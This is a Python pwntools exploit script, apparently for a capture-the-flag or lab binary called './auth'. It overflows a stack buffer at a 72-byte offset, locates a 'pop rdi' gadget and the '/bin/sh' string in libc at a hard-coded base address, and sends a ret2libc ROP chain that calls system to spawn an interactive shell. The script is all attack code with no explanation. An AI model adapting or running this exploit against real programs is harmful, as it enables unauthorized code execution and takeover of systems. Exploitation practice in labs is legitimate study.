from pwn import *

elf  = ELF('./auth')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
p    = process('./auth')

offset = 72

libc.address = 0x00007fffff5a0000

libc2 = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
pop_rdi_offset = next(libc2.search(b'\x5f\xc3'))
pop_rdi = libc.address + pop_rdi_offset

ret    = 0x401016
system = libc.sym['system']
binsh  = next(libc2.search(b"/bin/sh\x00")) + libc.address

log.info(f"libc base : {hex(libc.address)}")
log.info(f"pop rdi   : {hex(pop_rdi)}")
log.info(f"system    : {hex(system)}")
log.info(f"/bin/sh   : {hex(binsh)}")

payload  = b"A" * offset
payload += p64(ret)
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)

p.recvuntil(b":")
p.sendline(payload)
log.success("Shell!")
p.interactive()